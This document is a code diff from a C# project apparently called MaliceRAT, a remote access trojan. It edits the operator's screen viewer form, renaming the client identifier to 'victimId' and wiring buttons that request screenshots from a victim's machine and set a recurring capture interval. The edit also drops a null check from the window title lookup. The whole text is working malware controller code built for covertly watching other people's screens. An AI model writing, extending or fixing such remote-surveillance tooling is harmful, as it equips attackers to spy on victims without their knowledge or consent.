@@ -7,19 +7,18 @@ namespace MaliceRAT.RatUI
 {
     public partial class ScreenViewForm : Form
     {
-        private int clientId;
+        private int victimId;
         private Server server;
 
-        public ScreenViewForm(int clientId, Server server)
+        public ScreenViewForm(int victimId, Server server)
         {
             InitializeComponent();
-            this.clientId = clientId;
+            this.victimId = victimId;
             this.server = server;
             
             server.screenViewer.ScreenshotReceived += UpdateScreenImage;
 
-            Victim victim = server.GetVictimById(clientId);
-            titleLabel.Text = "Screen viewer [" + (victim != null ? victim.User : "Unknown") + "]";
+            titleLabel.Text = $"Screen viewer [{server.GetVictimById(victimId).User}]";
 
             int halfScreenWidth = Screen.PrimaryScreen.WorkingArea.Width / 2;
             int halfScreenHeight = Screen.PrimaryScreen.WorkingArea.Height / 2;
@@ -32,24 +31,24 @@ namespace MaliceRAT.RatUI
 
         private void StopButton_Click(object sender, EventArgs e)
         {
-            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(clientId), 0);
+            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(victimId), 0);
         }
 
         private void ScreenViewForm_FormClosing(object sender, FormClosingEventArgs e)
         {
-            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(clientId), 0);
+            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(victimId), 0);
         }
 
         private void UpdateButton_Click(object sender, EventArgs e)
         {
-            server.screenViewer.RequestScreenshot(server.GetVictimById(clientId));
+            server.screenViewer.RequestScreenshot(server.GetVictimById(victimId));
         }
 
         private void UpdateIntervalButton_Click(object sender, EventArgs e)
         {
             if (int.TryParse(intervalTextBox.Text, out int interval))
             {
-                server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(clientId), interval);
+                server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(victimId), interval);
             }
             else
             {
